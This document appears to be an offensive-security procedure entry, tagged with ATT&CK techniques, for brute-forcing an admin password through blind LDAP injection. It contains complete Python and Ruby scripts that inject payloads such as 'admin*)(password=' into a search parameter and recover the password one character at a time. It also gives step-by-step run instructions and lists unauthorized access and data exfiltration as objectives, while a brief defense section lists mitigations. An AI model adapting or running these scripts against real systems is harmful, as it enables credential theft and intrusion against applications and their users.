---
id: cfe703b1-90e3-434a-bbe9-6a6e11c36a31
name: Blind-LDAP-Injection-Password-Brute-Force
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:01.733202+00:00'
updated_at: '2023-04-10T20:36:29.407900+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Brute Force|T1110 - Brute Force]]'
  - '[[techniques/Password Policy Discovery|T1201 - Password Policy Discovery]]'
sub_techniques: []
tags:
  - '[[tags/LDAP Injection]]'
  - '[[tags/Scripts]]'
  - '[[tags/Special blind LDAP injection (without "*")]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Blind-LDAP-Injection-Password-Brute-Force

## Summary

This procedure uses blind LDAP injection to brute-force the admin user's password character by character without direct feedback from the server. It sends crafted HTTP requests to a vulnerable search endpoint, testing combinations until the correct password is constructed, enabling unauthorized access to sensitive systems or information.

## Description

In this technique, an attacker exploits an LDAP injection vulnerability in a web application's directory search functionality to perform a blind brute-force attack on the admin password. The injection point is typically in a search parameter that constructs an LDAP query like "(&(objectClass=person)(sn=admin*)(password=guess))". By appending payloads like "admin*)(password=guess", the attacker forces the server to evaluate boolean conditions indirectly through response differences (e.g., "TRUE CONDITION" vs. no match). The script iteratively builds the password by trying each possible character in the alphabet for each position, up to a maximum length, until the full password is discovered. This is effective against weak passwords and can be automated in Python or Ruby. The target environment is a web application with an exposed LDAP-backed search interface, such as a corporate directory or authentication portal.

## Requirements

1. Network access to the vulnerable web application endpoint (e.g., HTTP/HTTPS access to the search action).
2. Knowledge of the injection point, typically a GET parameter like "search" in a directory listing.
3. Python 3 or Ruby installed on the attacker's machine for script execution.
4. Optional: A wordlist or custom alphabet for password characters, though the script defines a comprehensive set including letters, digits, and symbols.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for all user-supplied inputs in LDAP queries, using parameterized queries or LDAP encoding libraries.
- Enforce account lockout policies after a few failed login attempts to mitigate brute-force attacks.
- Deploy multi-factor authentication (MFA) to add an additional layer beyond passwords.
- Monitor application logs for anomalous HTTP request patterns, such as repeated searches with unusual payloads or high request volumes from a single IP.
- Use web application firewalls (WAFs) with rules to detect LDAP injection signatures like ")*(password=" patterns.

## Objectives

1. Construct the admin user's password character by character via blind LDAP injection.
2. Gain unauthorized access to the LDAP directory or backend systems using the discovered credentials.
3. Exfiltrate sensitive user data or escalate privileges within the application.

## Instructions

### Step 1: Prepare the Environment

**Context**: Set up the attacker's machine with the necessary scripting language and verify connectivity to the target endpoint. Identify the exact injection point by testing basic LDAP payloads manually (e.g., via browser or curl) to confirm the vulnerability responds differently to true/false conditions.

Modify the script's target URL to match the vulnerable application (e.g., replace "http://ctf.web?action=dir&search=" with the actual endpoint). Ensure the alphabet covers likely password characters.

### Step 2: Execute the Python Brute-Force Script

**Context**: Run the Python script to automate the character-by-character brute-force. The script sends requests for each position (up to 50 characters), testing the alphabet until a match ("TRUE CONDITION" in response) is found, appending the correct character and proceeding.

**Code** ([[codes/Python-LDAP-Injection-Password-Brute-Forcer]]):

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

> This script builds the password progressively. Monitor console output for the growing "flag" value. If no match is found for a position, it may indicate the end of the password; adjust the loop range if needed. Expected runtime depends on password length and server response time—weak passwords (e.g., 8-12 chars) may take minutes to hours.

### Step 3: Alternative Execution with Ruby Script

**Context**: If Python is unavailable, use the Ruby equivalent for the same brute-force logic. It performs identical request testing but uses Ruby's Net::HTTP for HTTP interactions and regex for response matching.

**Code** ([[codes/Ruby-LDAP-Injection-Password-Brute-Forcer]]):

```ruby
#!/usr/bin/env ruby

require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''

(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end
```

> Run with `ruby script.rb`. The script outputs progress and appends matching characters. Success is indicated by the full password printed as the "flag". Verify by manually testing the password in the application login.
